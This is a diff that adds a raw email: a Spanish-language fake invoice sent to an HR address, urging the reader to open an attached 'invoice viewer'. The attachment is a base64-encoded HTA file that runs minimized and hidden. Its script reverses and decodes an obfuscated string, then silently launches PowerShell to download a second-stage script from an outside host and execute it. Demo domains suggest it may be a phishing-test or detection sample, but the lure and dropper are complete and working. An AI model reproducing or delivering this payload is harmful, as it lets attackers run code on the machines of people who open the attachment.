@@ -1,0 +1,32 @@
+Return-Path: <facturacion@proveedor-andes.co>
+Received: from mail.proveedor-andes.co ([203.0.113.66]) by mx01.empresa-demo.local; Wed, 14 Oct 2026 09:58:10 +0000
+From: "Facturacion Proveedor Andes" <facturacion@proveedor-andes.co>
+To: <rrhh@empresa-demo.local>
+Subject: Factura pendiente 0091
+Date: Wed, 14 Oct 2026 09:58:07 +0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="==SEP=="
+
+--==SEP==
+Content-Type: text/plain; charset="utf-8"
+
+Adjuntamos la factura 0091 pendiente de pago. Abra el visor adjunto.
+
+--==SEP==
+Content-Type: application/hta; name="Factura_0091.hta"
+Content-Disposition: attachment; filename="Factura_0091.hta"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGhlYWQ+PEhUQTpBUFBMSUNBVElPTiBpZD0iZnYiIHdpbmRvd3N0YXRlPSJtaW5pbWl6
+ZSIgc2hvd2ludGFza2Jhcj0ibm8iLz4KPHRpdGxlPlZpc29yIGRlIGZhY3R1cmFzPC90aXRsZT48
+L2hlYWQ+PGJvZHk+CjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPgp2YXIgZCA9ICI9SVNN
+ekJuTHp4RlVOVkVWNlluYmxSQ0ltQXlPeE1IY3VNSFhRMVVSVXBqZHVWR0pnVUdicFpFZDE5VUxn
+RXpjdzVpTWxkV1kwTjNMck5XYXNObUxzRkdkeTlHY3RNM2JuRkdjdjhpT3dSSGRvQmljM2xtSWdN
+V0xnNFdaa1JXYW9CeWR0QUNic1ZHYXpKWFozOUdjIjsKZnVuY3Rpb24gYjY0ZChzKXsgdmFyIHgg
+PSBuZXcgQWN0aXZlWE9iamVjdCgiTXN4bWwyLkRPTURvY3VtZW50IikuY3JlYXRlRWxlbWVudCgi
+dCIpOyB4LmRhdGFUeXBlPSJiaW4uYmFzZTY0IjsgeC50ZXh0PXM7IHJldHVybiB4Lm5vZGVUeXBl
+ZFZhbHVlOyB9CnZhciBjID0gYjY0ZChkLnNwbGl0KCIiKS5yZXZlcnNlKCkuam9pbigiIikpOwpu
+ZXcgQWN0aXZlWE9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1bihjLCAwKTsKd2luZG93LmNsb3Nl
+KCk7Cjwvc2NyaXB0PjwvYm9keT48L2h0bWw+Cg==
+
+--==SEP==--
